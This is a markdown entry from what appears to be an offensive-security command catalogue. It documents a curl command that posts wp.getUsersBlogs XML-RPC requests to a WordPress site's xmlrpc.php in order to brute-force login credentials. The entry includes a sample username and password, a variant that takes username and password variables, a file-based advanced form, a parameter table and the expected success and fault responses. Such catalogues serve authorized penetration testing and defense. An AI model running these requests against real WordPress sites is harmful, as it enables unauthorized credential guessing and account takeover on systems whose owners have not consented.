---
id: cmd-curl-xmlrpc-bruteforce
data: >-
  curl -s -X POST http://target.com/xmlrpc.php -d "<?xml
  version=\"1.0\"?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value><string>admin</string></value></param><param><value><string>password123</string></value></param></params></methodCall>"
tags:
  - brute-force
  - web
type: command
output: XML with user details or fault code
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:26:48.515Z'
verified: false
validated: true
submitted: true
---
# curl-xmlrpc-bruteforce

## Command

```bash
curl -s -X POST http://target.com/xmlrpc.php -d "<?xml version=\"1.0\"?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value><string>admin</string></value></param><param><value><string>password123</string></value></param></params></methodCall>"
```

## Description

Attempts a login via wp.getUsersBlogs XML-RPC method for brute forcing WordPress credentials.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-s` | Silent mode | Yes |
| `-X POST` | POST method | Yes |
| `http://target.com/xmlrpc.php` | Target URL | Yes |
| `-d '<payload>'` | XML with username/password | Yes |

## Examples

### Basic Usage

```bash
curl -s -X POST http://target.com/xmlrpc.php -d "<?xml version=\"1.0\"?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value><string>$user</string></value></param><param><value><string>$pass</string></value></param></params></methodCall>"
```

### Advanced Usage

```bash
curl -s -X POST http://target.com/xmlrpc.php -d @login.xml --fail
```

## Expected Output

Success: XML with blog/user info. Failure: `<faultCode>403</faultCode>`.

## Related

- [[Related Procedure: Brute-Force-WordPress-Logins-via-XML-RPC]]
